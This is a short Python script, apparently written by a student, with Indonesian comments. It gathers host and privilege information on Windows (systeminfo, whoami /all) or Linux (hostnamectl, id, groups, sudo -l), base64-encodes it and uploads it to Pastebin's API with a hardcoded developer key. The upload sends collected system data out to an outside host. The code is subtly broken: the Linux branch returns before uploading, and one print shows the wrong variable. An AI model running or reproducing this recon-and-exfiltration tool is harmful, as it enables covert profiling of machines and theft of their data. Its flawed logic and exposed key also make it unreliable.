# Dionysius Prayoga Hutomo - 2301925684
from platform import system
import subprocess,base64,requests

def main():
    # gunakan function system() untuk mendeteksi apakah system yang di-reconnaisance Windows atau linux 
    if system() == "Windows":
        # jika command e dijalankan maka akan mulai mengumpulkan informasi
        # windows mempunyai 2 jenis informasi yaitu host dan user serta privileges dengan argumen systeminfo dan whoami
        proc = subprocess.Popen(args="systeminfo", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output, error = proc.communicate()
        host = output.decode()
        collected = ''
        collected += f"Host + Info: \n{host}\n"
        # setelah informasi host didapatkan ditampung dan ditambahkan ke dalam variable collected.
        print(error.decode()) if error != b'' else print(host)

        proc = subprocess.Popen(args="whoami /all", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output, error = proc.communicate()
        userInfo = output.decode()
        collected += f"User Info and privileges: \n{userInfo}\n"
        # begitu juga dengan informasi yang didapatkan selanjutnya yakni info user dan privileges pada line di atas
        print(error.decode()) if error != b'' else print(userInfo)
        hasil = base64.b64encode(collected.encode())
    else:
        # dibandingkan dengan windows, linux mempunyai argumen yang lebih dari 2
        process = subprocess.Popen(args="hostnamectl",stdin=subprocess.PIPE,stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
        output,error = process.communicate()
        hostname = output.decode()
        collected = ''
        collected += f"Host + Info: {hostname}"

        print(error.decode()) if error != b'' else print(hostname)

        process = subprocess.Popen(args="whoami", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output, error = process.communicate()
        whoami = output.decode()
        collected += f"user: {whoami}\n"

        print(error.decode()) if error != b'' else print(whoami)
        # bedanya dengan windows, informasi user dibagi menjadi user dan user id ditambah dengan groups dan privileges
        process = subprocess.Popen(args="id", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output, error = process.communicate()
        id = output.decode()
        collected += f"userID: {id}\n"

        print(error.decode()) if error != b'' else print(id)

        process = subprocess.Popen(args="groups", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output, error = process.communicate()
        group = output.decode()
        collected += f"Groups: {group}\n"

        print(error.decode()) if error != b'' else print(group)

        process = subprocess.Popen(args="sudo -l", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output, error = process.communicate()
        priv = output.decode()
        collected += f"Privileges: \n{priv}\n"

        print(error.decode()) if error != b'' else print(id)
        hasil = base64.b64encode(collected.encode())
        return hasil

    # inputkan url dan data yang akan diupload
    url = "https://pastebin.com/api/api_post.php"
    data = {
        'api_dev_key': '42nRsaWiVL3LjJhSElVLOZAEX4lnf8OM',
        'api_paste_code': hasil,
        'api_paste_name': 'result',
        'api_option': 'paste'
    }
    paste = requests.post(url,data=data)
    urlResult = paste.text
    # display link ke 
    print(f"Link to Result: {urlResult}")

if __name__ == '__main__':
    main()
